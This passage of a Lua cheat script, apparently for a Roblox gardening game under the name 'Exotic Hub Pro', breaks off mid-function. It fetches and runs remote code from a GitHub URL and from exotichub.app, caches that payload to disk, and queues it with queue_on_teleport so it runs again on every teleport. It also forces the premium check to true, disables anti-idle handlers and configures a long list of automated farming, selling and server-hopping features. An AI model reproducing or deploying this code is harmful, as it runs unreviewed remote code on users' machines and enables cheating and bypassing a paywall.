local G = {}
G.IsPremium = function() return true end
G.RegisterReset = function() end

local isNoui = (tostring(getgenv().mode) == "noui")

if isNoui then
    -- Mock the UI library to absorb all UI creation calls without rendering anything
    local mockMeta = {
        __index = function(t, k) return t end,
        __call = function(t, ...) return t end
    }
    local mockUI = setmetatable({}, mockMeta)
    G.Library = mockUI
    G.Window = mockUI
    G.IsHeadless = function() return true end
else
    -- Load the real UI library from your link
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Reversed1337/Testing-123/refs/heads/main/zetahub_uilib"))()
    G.Library = Library

    -- Create the main window to pass to the script
    G.Window = Library:CreateWindow({
        Title = "Exotic Hub Pro",
        Footer = "exotichub.app/join | Hello World!",
        Position = UDim2.fromOffset(6, 6),
        Size = UDim2.fromOffset(720, 600),
        AutoShow = true,
        Center = true,
        Resizable = true,
        SearchbarSize = UDim2.fromScale(1, 1),
        CornerRadius = 4,
        NotifySide = "Right",
        ShowCustomCursor = false,
        Font = Enum.Font.Code,
        ToggleKeybind = Enum.KeyCode.RightControl,
        MobileButtonsSide = "Left",
    })
end
local V = game.GameId
if tostring(V) ~= "10200395747" then
	print("Exo: Invalid Game")
	return
end
if _G.is_running_gag2 then
	warn("Already running x")
	return
end
_G.is_running_gag2 = true
print("exo start > ")
print("Place Id ", game.PlaceId)
print("GameId: ", V)
local y = {}
y.GuiService = game:GetService("GuiService")
y.CollectionService = game:GetService("CollectionService")
y.LocalizationService = game:GetService("LocalizationService")
y.UserInputService = game:GetService("UserInputService")
y.Players = game:GetService("Players")
y.ReplicatedStorage = game:GetService("ReplicatedStorage")
y.Workspace = game:GetService("Workspace")
y.RunService = game:GetService("RunService")
y.ReplicatedFirst = game:GetService("ReplicatedFirst")
y.Lighting = game:GetService("Lighting")
y.Stats = game:GetService("Stats")
y.HttpService = game:GetService("HttpService")
y.MarketplaceService = game:GetService("MarketplaceService")
y.TeleportService = game:GetService("TeleportService")
y.LocalPlayer = y.Players.LocalPlayer
y.Backpack = y.LocalPlayer:WaitForChild("Backpack")
y.PlayerGui = y.LocalPlayer:WaitForChild("PlayerGui")
y.Character = y.LocalPlayer.Character or y.LocalPlayer.CharacterAdded:Wait()
y.LocalPlayer.CharacterAdded:Connect(function(G)
	y.Character = G
end)
y.LocalPlayer.CharacterRemoving:Connect(function(G)
	if y.Character == G then
		y.Character = nil
	end
end)
y.SharedData = y.ReplicatedStorage:FindFirstChild("SharedData")
y.SharedModules = y.ReplicatedStorage:FindFirstChild("SharedModules")
y.StockValues = y.ReplicatedStorage:FindFirstChild("StockValues")
y.CrateShop = y.StockValues:FindFirstChild("CrateShop")
y.ExclusiveShop = y.StockValues:FindFirstChild("ExclusiveShop")
y.GearShop = y.StockValues:FindFirstChild("GearShop")
y.SeedShop = y.StockValues:FindFirstChild("SeedShop")
y.fails = 0
function y.safeRequire(G)
	local V, Z = pcall(require, G)
	if not V or Z == nil then
		warn("[SafeRequire] Failed to load:", G)
		y.fails = y.fails + 1
		return nil
	end
	return Z
end
local Z = {}
Z.SaveDataKickRemoteRejoin = {
	PayloadUrlSaveDataKickRemoteRejoin = "https://exotichub.app/getautokickdetection.lua";
	CacheFileSaveDataKickRemoteRejoin = "exo_save_data_kick_rejoin_queue.lua",
	StartedSaveDataKickRemoteRejoin = false,
	GetQueueSaveDataKickRemoteRejoin = function()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end
		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end
		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end;
	IsValidPayloadSaveDataKickRemoteRejoin = function(G)
		if type(G) ~= "string" or # G < 500 then
			return false
		end
		return G:find("EXO_SAVE_DATA_KICK_REMOTE_PAYLOAD_V1", 1, true) ~= nil
	end;
	ReadCachedPayloadSaveDataKickRemoteRejoin = function()
		local G = Z.SaveDataKickRemoteRejoin.CacheFileSaveDataKickRemoteRejoin
		if type(isfile) ~= "function" or type(readfile) ~= "function" or not isfile(G) then
			return nil
		end
		local V, y = pcall(function()
			return readfile(G)
		end)
		if V and Z.SaveDataKickRemoteRejoin.IsValidPayloadSaveDataKickRemoteRejoin(y) then
			return y
		end
		return nil
	end,
	FetchPayloadSaveDataKickRemoteRejoin = function()
		local G = Z.SaveDataKickRemoteRejoin.PayloadUrlSaveDataKickRemoteRejoin
		local V, y = pcall(function()
			return game:HttpGet(G, true)
		end)
		if V and Z.SaveDataKickRemoteRejoin.IsValidPayloadSaveDataKickRemoteRejoin(y) then
			return y
		end
		return nil
	end;
	CachePayloadSaveDataKickRemoteRejoin = function(G)
		if type(writefile) ~= "function" then
			return false
		end
		if not Z.SaveDataKickRemoteRejoin.IsValidPayloadSaveDataKickRemoteRejoin(G) then
			return false
		end
		local V = Z.SaveDataKickRemoteRejoin.CacheFileSaveDataKickRemoteRejoin
		pcall(function()
			writefile(V, G)
		end)
		return true
	end,
	GetPayloadSaveDataKickRemoteRejoin = function()
		local G = Z.SaveDataKickRemoteRejoin.FetchPayloadSaveDataKickRemoteRejoin()
		if G then
			Z.SaveDataKickRemoteRejoin.CachePayloadSaveDataKickRemoteRejoin(G)
			return G
		end
		return Z.SaveDataKickRemoteRejoin.ReadCachedPayloadSaveDataKickRemoteRejoin()
	end;
	QueuePayloadSaveDataKickRemoteRejoin = function()
		local G = Z.SaveDataKickRemoteRejoin.GetQueueSaveDataKickRemoteRejoin()
		if type(G) ~= "function" then
			warn("[EXO SaveDataKick] queue_on_teleport missing")
			return false
		end
		local V = Z.SaveDataKickRemoteRejoin.CacheFileSaveDataKickRemoteRejoin
		if type(readfile) ~= "function" then
			warn("[EXO SaveDataKick] readfile missing")
			return false
		end
		pcall(function()
			G("loadstring(readfile(\"" .. (V .. "\"))()"))
		end)
		warn("[EXO SaveDataKick] queued remote cached payload")
		return true
	end,
	StartSaveDataKickRemoteRejoin = function()
		if Z.SaveDataKickRemoteRejoin.StartedSaveDataKickRemoteRejoin then
			return false
		end
		Z.SaveDataKickRemoteRejoin.StartedSaveDataKickRemoteRejoin = true
		local G = Z.SaveDataKickRemoteRejoin.GetPayloadSaveDataKickRemoteRejoin()
		if not G then
			warn("[EXO SaveDataKick] payload fetch/cache failed")
			return false
		end
		Z.SaveDataKickRemoteRejoin.CachePayloadSaveDataKickRemoteRejoin(G)
		return Z.SaveDataKickRemoteRejoin.QueuePayloadSaveDataKickRemoteRejoin()
	end
}
Z.SaveDataKickRemoteRejoin.StartSaveDataKickRemoteRejoin()
y.Networking = y.safeRequire(y.SharedModules:WaitForChild("Networking"))
y.SeedData = y.safeRequire(y.SharedModules:WaitForChild("SeedData"))
y.GearShopData = y.safeRequire(y.SharedModules:WaitForChild("GearShopData"))
y.PetData = y.safeRequire(y.SharedData:WaitForChild("PetData"))
y.RarityVisuals = y.safeRequire(y.SharedModules:WaitForChild("RarityVisuals"))
y.ReplicaClient = y.safeRequire(y.ReplicatedStorage.ClientModules.ReplicaClient)
y.MutationDataModule = y.SharedModules:WaitForChild("MutationData")
y.MutationData = y.safeRequire(y.MutationDataModule)
y.PetSizes = y.safeRequire(y.SharedData:WaitForChild("PetSizes"))
y.PetTypes = y.safeRequire(y.SharedData:WaitForChild("PetTypes"))
y.SellValueData = y.safeRequire(y.SharedModules:WaitForChild("SellValueData"))
y.SellFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("SellFlags"))
y.MergeFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("MergeFlags"))
y.FruitVisualizerController = y.safeRequire(y.LocalPlayer.PlayerScripts.Controllers.FruitVisualizerController)
y.DroppedItems = y.Workspace:WaitForChild("DroppedItems")
y.EventSeedDrops = (y.Workspace:WaitForChild("Map")):WaitForChild("SeedPackSpawnServerLocations")
y.CollectFruitNet = y.Networking and (y.Networking.Garden and y.Networking.Garden.CollectFruit)
y.WateringcanData = y.safeRequire(y.SharedModules:WaitForChild("WateringcanData"))
y.SprinklerData = y.safeRequire(y.SharedModules:WaitForChild("SprinklerData"))
y.MushroomData = y.safeRequire(y.SharedModules:WaitForChild("MushroomData"))
y.RaccoonData = y.safeRequire(y.SharedModules:WaitForChild("RaccoonData"))
y.GnomeData = y.safeRequire(y.SharedModules:WaitForChild("GnomeData"))
y.PowerHoseData = y.safeRequire(y.SharedModules:WaitForChild("PowerHoseData"))
y.TrowelData = y.safeRequire(y.SharedModules:WaitForChild("TrowelData"))
y.PropData = y.safeRequire(y.SharedModules:WaitForChild("PropData"))
y.GardenSyncController = y.safeRequire(y.LocalPlayer.PlayerScripts.Controllers:WaitForChild("GardenSyncController"))
y.PathfindingService = game:GetService("PathfindingService")
y.TweenService = game:GetService("TweenService")
y.PetSlotPrices = y.safeRequire(y.SharedData:WaitForChild("PetSlotPrices"))
y.MailboxItemCatalog = y.safeRequire(y.LocalPlayer.PlayerScripts.Controllers.MailboxController:WaitForChild("MailboxItemCatalog"))
y.ExpansionPrices = y.safeRequire(y.SharedData:WaitForChild("ExpansionPrices"))
y.GardenFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("GardenFlags"))
y.TimeCycleData = y.safeRequire(y.SharedModules:WaitForChild("TimeCycleData"))
local j = y.SharedModules and y.SharedModules:FindFirstChild("WeatherData")
y.WeatherData = j and y.safeRequire(j) or nil
y.PerfFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("PerfFlags"))
y.PlantVisualizerController = y.safeRequire(y.LocalPlayer.PlayerScripts.Controllers:WaitForChild("PlantVisualizerController"))
y.SeedShopFlags = y.safeRequire(y.SharedModules.Flags.SeedShopFlags)
y.GearShopFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("GearShopFlags"))
y.CrateData = y.safeRequire(y.SharedModules:WaitForChild("CrateData"))
y.CrateShopFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("CrateShopFlags"))
y.EggData = y.safeRequire(y.SharedModules:WaitForChild("EggData"))
y.SeedPackData = y.safeRequire(y.SharedModules:WaitForChild("SeedPackData"))
local i = y.SharedModules and y.SharedModules:FindFirstChild("Auctioneer")
y.Auctioneer = i and y.safeRequire(i) or nil
local c = y.SharedModules and (y.SharedModules:FindFirstChild("Flags") and y.SharedModules.Flags:FindFirstChild("AuctioneerFlags"))
y.AuctioneerFlags = c and y.safeRequire(c) or nil
local J = y.SharedModules and y.SharedModules:FindFirstChild("PetLureData")
y.PetLureData = J and y.safeRequire(J) or nil
y.PlantGenerationModulesRoot = y.ReplicatedStorage:WaitForChild("PlantGenerationModules")
y.FruitGenerationModules = y.PlantGenerationModulesRoot:WaitForChild("Fruits")
y.PlantGenerationModules = y.PlantGenerationModulesRoot:WaitForChild("Plants")
y.WeightFormat = y.safeRequire(y.SharedModules:WaitForChild("WeightFormat"))
y.CalculateOvertimeGrowth = y.safeRequire(y.SharedModules:WaitForChild("CalculateOvertimeGrowth"))
y.OvertimeGrowthFlags = y.safeRequire(y.SharedModules.Flags:WaitForChild("OvertimeGrowthFlags"))
y.FruitValueCalc = y.safeRequire(y.SharedModules:WaitForChild("FruitValueCalc"))
y.GrowRateData = y.safeRequire(y.SharedModules:WaitForChild("GrowRateData"))
y.RemoteEvent = y.SharedModules.Packet.RemoteEvent
y.FruitGenerationData = {}
y.PlantGenerationData = {}
for G, V in ipairs(y.FruitGenerationModules:GetChildren()) do
	if V:IsA("ModuleScript") then
		y.FruitGenerationData[V.Name] = y.safeRequire(V)
	end
end
for G, V in ipairs(y.PlantGenerationModules:GetChildren()) do
	if V:IsA("ModuleScript") then
		y.PlantGenerationData[V.Name] = y.safeRequire(V)
	end
end
function Addcantsleep()
	local G = getconnections or get_signal_cons
	if G then
		for G, V in pairs((G)(y.LocalPlayer.Idled)) do
			if V.Disable then
				V.Disable(V)
			elseif V.Disconnect then
				V.Disconnect(V)
			end
		end
	end
end
pcall(function()
	Addcantsleep()
end)
pcall(function()
	y.LocalPlayer:SetAttribute("AntiAfkIdleOverride", 31536000)
end)
local T = G.Library
local d = G.Window
local u = type(G.IsHeadless) == "function" and G.IsHeadless() == true
y.AppName = "Exotic Hub"
y.CurentV = "v95"
y.invite_link_url = "https://exotichub.app/join"
y.invite_link_short = "exotichub.app/join"
local q = {}
local g = {}
local E = {}
local a = {}
local H = {}
local r = {}
local Y = {}
local e = {}
local s = {}
local N = {}
local W = {
	UseDefault = "Default Placement",
	Default = "Farm Middle";
	RightBackCenter = "RightFarm BackCenter";
	LeftBackCenter = "LeftFarm BackCenter";
	RightFrontCenter = "RightFarm FrontCenter";
	LeftFrontCenter = "LeftFarm FrontCenter";
	BackInsetStuds = 10
}
W.Options = {
	W.Default;
	W.RightBackCenter;
	W.LeftBackCenter;
	W.RightFrontCenter;
	W.LeftFrontCenter
}
W.AreaByPlacement = {
	[W.RightBackCenter] = "PlantAreaColumn2";
	[W.LeftBackCenter] = "PlantAreaColumn1";
	[W.RightFrontCenter] = "PlantAreaColumn2";
	[W.LeftFrontCenter] = "PlantAreaColumn1"
}
local X = {
	enabled = false,
	status = "",
	snapshot = {},
	filters = {},
	goals = {},
	locks = {};
	cooldowns = {},
	cache = {}
}
g.is_forced_stop = false
g.is_private_server = false
g.BuySelectFruitSelected = {}
g.BuySelectFruitUi = g.BuySelectFruitUi or {}
g.FruitCollectOverrideUiRefs = g.FruitCollectOverrideUiRefs or {}
g.SellMultiplierOverrideUiRefs = g.SellMultiplierOverrideUiRefs or {}
g.is_pro = true
g.SaveSyncPremiumAtStartup = true
g.GetCheckIfPro = function()
    return true
end
if type(G.RegisterReset) == "function" then
    G.RegisterReset(function()
    end)
end
g.RarityRank = {
	Common = 1;
	Uncommon = 2;
	Rare = 3;
	Epic = 4,
	Legendary = 5,
	Mythic = 6;
	Super = 7;
	Secret = 8
}
g.TeleportLockNames = {
	SeedPackCollector = "Seed Collection",
	SeedPlacer = "Seed Placement System",
	FruitCollector = "Fruit Collector",
	PetFarmReturn = "Pet Farm Return";
	EventCollector = "Event Collection";
	GardenItemCollector = "Garden Item Collector";
	PremiumFruitCollector = "Premium Fruit Collector",
	SprinklerPlacer = "Sprinkler Placement";
	PetFinderPremium = "Pet Finder Premium";
	WaterPlants = "Water Plants",
	FriendGardenCare = "Friend Garden Care",
	GiftDropPickup = "Gift Drop Pickup";
	Other = "Other"
}
g.PetAndSeedTravelTimeoutSeconds = 90
g.GetProMessage = function()
	local G = string.format("\240\159\148\146 <stroke th=\'0.1\' joins=\'round\' sizing=\'fixed\' color=\'#8C1600\'><font color=\'#FA2B00\'> Premium Feature - Join discord server to get Key.</font></stroke>")
	return G
end
local h = {
	full_performance_mode = false,
	remove_plants = false,
	remove_weather_visuals = false,
	sprinkler_time_esp_enabled = true;
	high_mode = false,
	server_project_kick_public = false,
	stack_keep_overrides_enabled = false;
	stack_keep_overrides = {};
	total_control_enabled = false,
	farm_default_placement = W.Default;
	farm_placement_mode_options_migration_v1 = false;
	garden_items_use_player_walk = true,
	weather_kick_rejoin_enabled = true;
	weather_kick_enabled = false,
	weather_kick_selected = {},
	gift_send_enabled = false,
	gift_receive_enabled = false,
	gift_receive_mode = "Trusted Only",
	gift_send_targets = {};
	gift_receive_trusted = {},
	gift_receive_item_whitelist = {};
	gift_fruit_list = {};
	gift_min_weight = 0;
	gift_max_weight = 89;
	gift_mutation_whitelist = {},
	gift_mutation_blacklist = {};
	gift_variant_whitelist = {};
	gift_variant_blacklist = {},
	gift_max_per_cycle = 1,
	gift_delay = 1.25,
	gift_wait_timeout = 8;
	gift_preview_only = true;
	gift_keep_amount_per_fruit = 0;
	gift_only_when_backpack_over = 0,
	gift_send_order = "Lowest Weight First";
	gift_protect_favourites = true,
	gift_drop_pickup_enabled = false,
	gift_drop_pickup_mode = "Trusted Only";
	gift_drop_pickup_from = {};
	gift_drop_pickup_categories = {
		HarvestedFruits = true
	};
	gift_drop_pickup_use_player_walk = false;
	auto_drop_items_enabled = false,
	auto_drop_preview_only = true,
	auto_drop_categories = {
		HarvestedFruits = true,
		Seeds = true
	},
	auto_drop_fruit_list = {},
	auto_drop_min_weight = 0,
	auto_drop_max_weight = 89;
	auto_drop_mutation_whitelist = {},
	auto_drop_mutation_blacklist = {};
	auto_drop_variant_whitelist = {},
	auto_drop_variant_blacklist = {},
	auto_drop_protect_favourites = true;
	auto_drop_keep_amount_per_fruit = 0;
	auto_drop_seed_list = {};
	auto_drop_item_names = {};
	auto_drop_pet_selected = {};
	auto_drop_pet_protected = {},
	auto_drop_pet_rarity_whitelist = {};
	auto_drop_pet_rarity_blacklist = {};
	auto_drop_pet_size_whitelist = {};
	auto_drop_pet_size_blacklist = {};
	auto_drop_pet_variant_whitelist = {};
	auto_drop_pet_variant_blacklist = {};
	auto_drop_pet_keep_amount = 0,
	auto_drop_pet_protect_equipped = true;
	auto_drop_max_per_cycle = 1,
	auto_drop_delay = .75;
	auto_drop_order = "Fruits Lowest Weight";
	seed_drop_pick_enabled = false,
	seed_drop_pick_selected = {};
	seed_drop_pick_rejoin_limit = 100;
	seed_drop_pick_rejoin_count = 0;
	seed_drop_pick_rejoin_delay = 10;
	mutation_seed_placer_enabled = false;
	mutation_seed_placer_seed = {};
	mutation_seed_placer_keep_plants = {};
	mutation_seed_placer_seed_count = 1;
	mutation_seed_placer_place_delay = .1,
	mutation_seed_placer_rejoin = false,
	mutation_seed_placer_rejoin_delay = 10;
	mutation_seed_placer_rejoin_amount = 10;
	mutation_seed_placer_rejoin_count = 0,
	mutation_seed_placer_webhook_success = true;
	mutation_seed_placer_webhook_failure = false,
	mutation_seed_placer_shovel_failed = false,
	auto_expand_garden = false;
	auto_expand_garden_max_slot = 2,
	auto_expand_pet_inventory = false,
	auto_expand_pet_inventory_max_upgrade = 1,
	potted_weather_guard_enabled = false,
	potted_weather_guard_place_mode = "Saved Location",
	potted_weather_guard_selected_plants = {},
	potted_weather_guard_weather_selected = {},
	potted_weather_guard_saved_cframe = {},
	potted_weather_guard_place_same_spot = false;
	potted_weather_guard_max_per_cycle = 3,
	potted_weather_guard_action_delay = .3,
	potted_weather_guard_y_step = 4;
	potted_weather_guard_fruit_min_kg = 0,
	potted_weather_guard_fruit_max_kg = 100000000;
	potted_weather_guard_plant_mutations = {},
	pet_inventory_min_sheckles_enabled = false;
	pet_inventory_min_sheckles = 0,
	player_speed_enabled = false;
	player_speed_value = 80;
	web_api_key = "";
	webhook_enabled = true;
	webhook_url = "",
	webhook_pet_buys = true,
	webhook_mail_manual = true;
	webhook_mail_auto = true,
	webhook_mail_claims = true,
	webhook_event_seeds = true,
	egg_hatcher_enabled = false,
	egg_hatcher_selected = {};
	egg_hatcher_protected = {},
	egg_hatcher_delay = .35;
	egg_hatcher_max_per_cycle = 1,
	egg_hatcher_equip_tool = true;
	egg_hatcher_keep_pets = {};
	egg_hatcher_keep_rarities = {},
	egg_hatcher_keep_sizes = {};
	egg_hatcher_keep_variants = {};
	egg_hatcher_keep_super_rarity = true;
	egg_hatcher_pet_keep_filters = {};
	egg_hatcher_rejoin_delay = 15;
	egg_hatcher_rejoin_after_hatch = false,
	egg_hatcher_rejoin_open_limit = 0;
	egg_hatcher_pause_other_systems = false;
	egg_hatcher_webhook_enabled = true,
	egg_hatcher_webhook_pets = {};
	egg_hatcher_webhook_rarities = {};
	egg_hatcher_webhook_sizes = {};
	egg_hatcher_webhook_variants = {};
	seed_pack_opener_enabled = false,
	seed_pack_opener_selected = {};
	seed_pack_opener_protected = {};
	seed_pack_opener_delay = .35;
	seed_pack_opener_max_per_cycle = 1;
	seed_pack_opener_equip_tool = true,
	seed_pack_opener_webhook_enabled = true;
	seed_pack_opener_webhook_seeds = {};
	seed_pack_opener_webhook_rarities = {};
	pet_finder_enabled = false,
	pet_finder_buy_list = {};
	pet_finder_auto_hop = false;
	pet_finder_hop_minutes = 5,
	pet_finder_purchase_log = {},
	water_plant_wait_effect = false;
	water_plant_delay = 0;
	auto_water_plants = false,
	water_plant_selected_cans = {};
	water_plant_mode = "Growing Plant";
	water_plant_target_plant = "",
	water_plant_saved_position = {},
	hide_player_ui = false;
	plant_fruit_esp_fruit_enabled = false,
	plant_fruit_esp_plant_enabled = false,
	plant_fruit_esp_names = {};
	plant_fruit_esp_min_kg = 0,
	plant_fruit_esp_max_kg = 100000000,
	plant_fruit_esp_max_distance = 150;
	backpack_fruit_price_esp_enabled = false,
	backpack_fruit_total_value_esp_enabled = false,
	auto_fruit_favourite_enabled = false;
	auto_fruit_favourite_names = {},
	auto_fruit_favourite_min_kg = 0;
	auto_fruit_favourite_max_kg = 100000000;
	auto_fruit_favourite_mutations = {},
	auto_fruit_favourite_variants = {};
	auto_fruit_favourite_max_value = 0,
	manual_fruit_favourite_names = {};
	manual_fruit_favourite_min_kg = 0,
	manual_fruit_favourite_max_kg = 100000000,
	manual_fruit_favourite_mutations = {};
	manual_fruit_favourite_variants = {};
	manual_fruit_favourite_max_value = 0,
	water_plant_weather_enabled = false,
	water_plant_weather_selected = {};
	friend_garden_care_enabled = false;
	friend_garden_care_friends = {};
	friend_garden_care_location_mode = W.UseDefault,
	friend_garden_care_saved_positions = {},
	friend_garden_care_watering_cans = {},
	friend_garden_care_use_speed_pets = true;
	friend_garden_care_sprinklers = {};
	friend_garden_care_placement_delay = .15;
	friend_garden_care_rejoin = false,
	friend_garden_care_max_watering = 0;
	sprinkler_place_weather_enabled = false,
	sprinkler_place_weather_selected = {};
	auto_sprinkler_place = false,
	sprinkler_replace_near_expiry_enabled = false;
	sprinkler_place_selected = {},
	sprinkler_place_default_target = 1;
	sprinkler_place_overrides = {};
	sprinkler_place_mode = W.UseDefault,
	sprinkler_place_target_plant = "",
	sprinkler_place_saved_position = {};
	sprinkler_place_teleport = false;
	sprinkler_place_delay = .6;
	shovel_plant_variant_blacklist = {},
	sell_when_backpack_full = false;
	auto_collect_event_seeds = true,
	auto_collect_drop_seeds = true;
	is_frist_run = false,
	seed_avoid = {},
	gear_shop_avoid = {},
	shop_selected_migration_v1 = false,
	seed_shop_buy_selected = {};
	enabled_seed_shop = false;
	seed_shop_min_sheckles_enabled = false;
	seed_shop_min_sheckles = 0,
	seed_shop_trigger_enabled = false;
	seed_shop_trigger_name = "Any Time";
	gear_shop_buy_selected = {},
	enabled_gear_shop = false;
	gear_shop_min_sheckles_enabled = false;
	gear_shop_min_sheckles = 0;
	gear_shop_trigger_enabled = false,
	gear_shop_trigger_name = "Any Time",
	crate_shop_buy_selected = {};
	enabled_crate_shop = false,
	crate_shop_min_sheckles_enabled = false,
	crate_shop_min_sheckles = 0;
	crate_shop_trigger_enabled = false;
	crate_shop_trigger_name = "Any Time",
	fast_auction_enabled = false,
	fast_auction_min_percent = 50,
	fast_auction_rejoin = false,
	fast_auction_rejoin_attempts = 10;
	auctioneer_enabled = false;
	auctioneer_preview_only = true,
	auctioneer_buy_selected = {},
	auctioneer_blacklisted_items = {},
	auctioneer_min_sheckles = 0,
	auctioneer_min_percent = 50;
	auctioneer_webhook_success = true,
	auctioneer_webhook_fail = false,
	auctioneer_overrides = {};
	auto_collect_fruit_enabled = false,
	lite_fruit_collection = false,
	lite_fruit_collection_speed = 40,
	fruit_collect_nolimits = false,
	fruit_collect_prevent_destroy_plants = false;
	collect_fruit_list = {},
	collect_min_weight = 0,
	collect_max_weight = 150;
	collect_mutation_whitelist = {};
	collect_mutation_blacklist = {},
	collect_variant_whitelist = {};
	collect_variant_blacklist = {},
	collect_sort_mode = "Default";
	collect_fruit_overrides = {};
	auto_seedplace = false,
	smart_seed_progression_enabled = false,
	smart_seed_progression_mutation_seeds_enabled = false,
	smart_seed_progression_prevent_placement_seeds = {};
	smart_seed_progression_prevent_shovel_plants = {
		["Hypno Bloom"] = true,
		["Moon Bloom"] = true;
		["Briar Rose"] = true;
		["Venom Spitter"] = true;
		["Dragon\'s Breath"] = true;
		["Venus Fly Trap"] = true
	};
	smart_seed_progression_prevent_shovel_rarity = {
		Super = true;
		Secret = true
	},
	allowed_seedsplace = {},
	seed_place_default_target = 10,
	seed_place_delay = .3,
	seed_place_mode = "Random",
	seed_place_saved_position = {};
	seed_place_max_garden_plants = 800,
	seed_place_overrides = {},
	seed_place_wall_mode = false;
	seed_place_stack_mode = false,
	seed_place_stack_mode_underground = false,
	auto_sell_sellallinventory = false;
	sell_use_filters = false;
	sell_fruit_list = {},
	sell_min_weight = 0;
	sell_max_weight = 89,
	sell_mutation_whitelist = {};
	sell_mutation_blacklist = {},
	sell_variant_whitelist = {};
	sell_variant_blacklist = {},
	sell_multiplier_enabled = false,
	sell_multiplier_collect_only = true,
	sell_multiplier_show_live = false,
	sell_multiplier_board_selected = {},
	sell_multiplier_overrides = {};
	auto_sell_pets = false,
	pet_sell_preview_only = true,
	pet_sell_selected = {};
	pet_sell_protected = {},
	pet_sell_protected_ids = {},
	pet_sell_duplicate_only = true;
	pet_sell_keep_amount = 1;
	pet_sell_max_per_cycle = 3,
	pet_sell_delay = .25;
	pet_sell_max_rarity = "Rare";
	pet_sell_max_base_price = 0,
	pet_sell_protect_rainbow = true,
	pet_sell_protect_big_huge = true;
	pet_sell_size_whitelist = {};
	pet_sell_size_blacklist = {},
	pet_sell_variant_whitelist = {};
	pet_sell_variant_blacklist = {},
	turbo_sell = false;
	hide_log_ui = false,
	collection_teleport = true;
	char_farm_middle = false;
	auto_shovel_fruits = false;
	shovel_fruit_types = {};
	shovel_mutation_whitelist = {},
	shovel_mutation_blacklist = {};
	shovel_min_weight = 0,
	shovel_max_weight = 99,
	shovel_variants = {
		Normal = true,
		Gold = true,
		Rainbow = true
	};
	auto_shovel_plants = false,
	shovel_plant_types = {};
	shovel_plant_min_height = 0,
	shovel_plant_max_height = 200;
	shovel_plant_variants = {},
	shovel_growing_plants = false;
	shovel_plants_keep = 10;
	auto_trowel_plants = false,
	trowel_plant_types = {};
	trowel_use_fixed_spot = true;
	trowel_fixed_placement = W.UseDefault,
	trowel_saved_position = {};
	pet_return_farm = false,
	pet_return_farm_timer = 60;
	pet_equip_enabled = false;
	pet_equip_log_enabled = true;
	pet_equip_restore_previous = true;
	pet_equip_protect_rainbow = true,
	pet_equip_protect_big_huge = true;
	pet_equip_protect_super_secret = true,
	pet_equip_protected_names = {};
	pet_equip_protected_ids = {},
	pet_equip_rules = {};
	pet_equip_active_rule_id = "";
	pet_equip_manual_rule_id = "";
	pet_equip_restore_snapshot = {},
	pet_triggers_v2_enabled = false,
	pet_triggers_v2_rules = {},
	mail_manual_batch_together = false,
	mail_auto_batch_together = false,
	mail_auto_send_enabled = false,
	mail_auto_accept = false;
	mail_auto_accept_multiplier_rules = {},
	mail_include_comment = false,
	mail_next_send_at = 0,
	mail_manual_order = {},
	mail_auto_rules = {};
	mail_receipts = {};
	mail_web_completed_orders = {},
	mail_ignore_batch_limit = false,
	auto_use_daily_deal = false,
	daily_deal_status_enabled = false;
	daily_deal_min_backpack_value = 0,
	auto_double_or_nothing = false;
	double_or_nothing_target_streak = 3,
	double_or_nothing_roll_delay = .15;
	double_or_nothing_webhook_win = true;
	double_or_nothing_webhook_loss = false,
	step_teleport_speed = 60,
	save_sync_online_enabled = false;
	save_sync_auto_pull_enabled = false,
	save_sync_share_code = "",
	save_sync_own_share_code = "";
	save_sync_own_revision = 0;
	save_sync_pull_revision = 0;
	save_sync_pull_hash = "";
	save_sync_last_hash = ""
}
local l = type(getgenv) == "function" and getgenv() or _G
local B = type(l.gag2_config) == "table" and l.gag2_config or nil
g.SaveSyncDebugEnabled = l.is_debug == true
g.player_userid = y.LocalPlayer.UserId
if not g.player_userid then
	warn("Invalid player detected.")
	return
end
g.alt_Plants_Physical = g.alt_Plants_Physical or {}
g.MakeAltFolder = function(G)
	if not G then
		warn("MakeAltFolder requires a userId!")
		return nil
	end
	local V = tostring(G) .. "_Plants"
	local Z = y.ReplicatedStorage:FindFirstChild(V)
	if Z then
		g.alt_Plants_Physical[G] = Z
		return Z
	end
	local j = Instance.new("Folder")
	j.Name = V
	j.Parent = y.ReplicatedFirst
	g.alt_Plants_Physical[G] = j
	return j
end
g.MakeAltFolder(g.player_userid)
local L = "exotichub99"
if not isfolder(L) then
	makefolder(L)
end
local m = L .. ("/" .. (tostring(g.player_userid) .. "gag2.json"))
a.Config = {
	Excluded = {
		pet_finder_purchase_log = true,
		mail_manual_batch_together = true,
		mail_next_send_at = true;
		mail_manual_order = true;
		mail_receipts = true,
		mail_web_completed_orders = true;
		save_sync_online_enabled = true;
		save_sync_auto_pull_enabled = true,
		save_sync_share_code = true;
		save_sync_own_share_code = true;
		save_sync_own_revision = true;
		save_sync_pull_revision = true;
		save_sync_pull_hash = true,
		save_sync_last_hash = true
	};
	OnlineExcluded = {
		mail_manual_batch_together = true,
		mail_next_send_at = true,
		mail_manual_order = true;
		mail_receipts = true;
		mail_web_completed_orders = true,
		save_sync_online_enabled = true,
		save_sync_auto_pull_enabled = true;
		save_sync_share_code = true,
		save_sync_own_share_code = true;
		save_sync_own_revision = true,
		save_sync_pull_revision = true,
		save_sync_pull_hash = true;
		save_sync_last_hash = true
	};
	OverrideEnabled = type(B) == "table",
	ToLua = function(G, V)
		V = tonumber(V) or 0
		local y = type(G)
		if y == "string" then
			return string.format("%q", G)
		end
		if y == "number" or y == "boolean" then
			return tostring(G)
		end
		if y ~= "table" then
			return "nil"
		end
		local Z = {}
		for G in pairs(G) do
			table.insert(Z, G)
		end
		if # Z == 0 then
			return "{}"
		end
		table.sort(Z, function(G, V)
			if type(G) == type(V) then
				if type(G) == "number" then
					return G < V
				end
				return tostring(G) < tostring(V)
			end
			return type(G) < type(V)
		end)
		local j = string.rep("    ", V)
		local i = string.rep("    ", V + 1)
		local c = {
			"{"
		}
		for y, Z in ipairs(Z) do
			local j
